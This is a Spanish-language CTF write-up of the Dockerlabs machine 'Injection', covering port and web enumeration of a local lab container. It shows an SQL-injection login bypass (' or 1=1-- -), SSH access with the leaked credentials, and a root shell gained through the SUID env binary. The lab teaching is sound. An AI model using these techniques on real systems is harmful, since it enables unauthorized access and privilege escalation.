---
title:  "Injection - Dockerlabs"
header:
  teaser:
categories: 
  - CTFs
tags:
  - Dockerlabs
---

La máquina **Injection** de [Dockerlabs](https://dockerlabs.es/) está clasificada como de nivel muy fácil. Posee un sitio web vulnerable a SQLi que nos proporcionará un usuario y contraseña para acceder al sistema. Una vez conectados por SSH, deberemos aprovechar los privilegios que el usuario tiene sobre el binario `/env` para escalar privilegios.

## Reconocimiento

Comienzo desplegando la máquina docker con el script de auto_deploy. Me aseguro que se encuentra activa haciendo un ping.

```shell
ping -c 1 172.17.0.2                                                                                                                                
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.095 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.095/0.095/0.095/0.000 ms
```

El siguiente paso es hacer un nmap para ver que puertos tiene abiertos. Utilizo los siguientes parámetros:

- -p-: Escanear todos los puertos (65535).
- –open: Mostrar solo los puertos abiertos.
- -sS: Realiza un TCP SYN Scan para escanear rápidamente que puertos están abiertos.
- –min-rate 5000: Indicamos que el escaneo no vaya más lento que 5000 paquetes por segundo.
- -vvv: El modo verbose nos muestra la información según se va encontrando.
- -n: No realizar resolución de DNS. Así evitamos que el escaneo dure más tiempo del necesario.
- -Pn: Deshabilitar el descubrimiento de host mediante ping.
- -oG: Exportar el resultado a un fichero en una sola línea para que podamos usar comandos como: grep, awk, sed, etc. 

```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports                                                                  

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 12:34 EDT
Initiating ARP Ping Scan at 12:34
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 12:34, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:34
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 12:34, 0.77s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000060s latency).
Scanned at 2024-05-29 12:34:17 EDT for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.96 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Encuentra 2 puertos abiertos: 

- 22 (SSH)
- 80 (HTTP)

Ejecuto otro nmap para analizar los servicios y versiones de esos puertos. Los comandos usados son:

- -sCV: Detectar el servicio y aplicar scripts básicos de reconocimiento.
- -p: Indicar los puertos a escanear.
- -oN: Exportar el resultado a un archivo.

```shell
 nmap -sCV -p22,80 172.17.0.2 -oN target                                  
 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 12:36 EDT
Nmap scan report for 172.17.0.2
Host is up (0.00017s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Iniciar Sesi\xC3\xB3n
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.39 seconds
```

Uso whatweb para ver que tecnologías se usan en la web.

```shell
whatweb http://172.17.0.2                                                                                                                           
http://172.17.0.2 [200 OK] Apache[2.4.52], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[172.17.0.2], PasswordField[password], Title[Iniciar Sesión]
```

Para enumerar archivos y directorios uso la herramienta dirsearch. Le indico que no me muestre varios códigos de estado HTTP.

```shell
dirsearch -u http://172.17.0.2 --exclude-status 403,404,500,502,400,401                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/injection/nmap/reports/http_172.17.0.2/_24-05-29_12-38-12.txt

Target: http://172.17.0.2/

[12:38:12] Starting: 
[12:38:23] 200 -    0B  - /config.php                                       
[12:38:28] 200 -  976B  - /index.php/login/                                 
Task Completed
```

## Análisis de vulnerabilidades

Accedo a la web y me encuentro con la página que viene por defecto en la instalación de apache.

![Injection 1](/assets/images/2024-05-29-Injection/injection_1.png)

Voy al index.php que he encontrado antes con dirsearch. Allí, veo que hay login de usuario.

![Injection 2](/assets/images/2024-05-29-Injection/injection_2.png)

Pruebo el clásico admin::admin, pero no da resultado.

![Injection 3](/assets/images/2024-05-29-Injection/injection_3.png)

## Explotación de vulnerabilidades

Intento hacer una SQL injection para entrar. Usando `' or 1=1-- -` consigo hacer login.

![Injection 4](/assets/images/2024-05-29-Injection/injection_4.png) 

![Injection 5](/assets/images/2024-05-29-Injection/injection_5.png)

Al parecer, no hay mucho más que hacer en la web. Investigo si hay algo interesante en config.php, pero no veo nada.

Es posible que el mencionado usuario "dylan" exista en el sistema y su contraseña sea la misma que la del login. Intento acceder por ssh a la máquina y consigo entrar.

```shell
ssh dylan@172.17.0.2                                                                                                                                
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:5ic4ZXizeEb8agR4jNX59cBONCe5b5iEcU9lf2zt0Q0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
dylan@172.17.0.2's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.6.9-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dylan@bb585b76a84c:~$ whoami
dylan
dylan@bb585b76a84c:~$
```

## Escalada de privilegios

Reviso mi usuario actual.

```shell
dylan@bb585b76a84c:~$ id
uid=1000(dylan) gid=1000(dylan) groups=1000(dylan)
```

Listando desde la raíz binarios con permisos SUID, encuentro `/env`. 

```shell
dylan@92056a7029d2:/$ find \-perm -4000 2>/dev/null
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/openssh/ssh-keysign
./usr/bin/chsh
./usr/bin/su
./usr/bin/mount
./usr/bin/umount
./usr/bin/passwd
./usr/bin/gpasswd
./usr/bin/chfn
./usr/bin/env
./usr/bin/newgrp
```

Ejecuto `sudo env /bin/sh` para obtener una shell como root, pero me dice que `sudo` no está instalado en el sistema.

```shell
dylan@bb585b76a84c:/$ sudo env /bin/sh
-bash: sudo: command not found
```

Buscando en [env | GTFOBins](https://gtfobins.github.io/gtfobins/env/) encuentro como conseguir una shell ejecutando `./env /bin/sh -p`.

```shell
dylan@bb585b76a84c:/$ /usr/bin/env /bin/sh -p
# whoami
root
```
